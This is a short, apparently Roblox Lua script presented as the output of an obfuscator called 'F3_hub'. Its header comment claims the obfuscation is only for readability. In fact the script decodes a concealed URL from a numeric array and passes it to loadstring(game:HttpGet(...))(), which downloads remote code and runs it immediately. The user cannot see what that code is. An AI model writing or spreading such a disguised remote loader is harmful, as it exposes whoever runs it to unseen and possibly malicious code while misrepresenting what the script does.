--[[ F3_hub // HARD++ LUA OBFUSCATOR ]]
-- transforms: names + strings + numbers + comments | runtime key: 120
-- note: local readability obfuscation only; never store secrets in client code.
local function F3_hub_d3c_decode(b,k,s)local o={} for i=1,#b do local n=(b[i]-k-((i)*s))%256 o[i]=string.char((n+256)%256) end return table.concat(o) end
loadstring(game:HttpGet(F3_hub_d3c_decode({231,250,1,4,14,220,216,223,24,46,46,250,61,72,76,81,84,36,96,115,120,65,122,144,144,93,171,109,114,182,198,185,210,201,223,221,235,246,252,191,7,19,7,24,28,29,240,42,53,8,19,21,30,88,95,101,60,115,121,80,84,143,103,107,162,167,174,137,140,147,157,167,217,179,185,189,200,205,214,216,227,239,32,244,47,53,9,24,74,81,45,53,57,67,70,74,133,139,98,107,115,167,173,137,184,194,203,157,166,170,177,183,243,5,20,18,23,33,26,36},120,7)))()
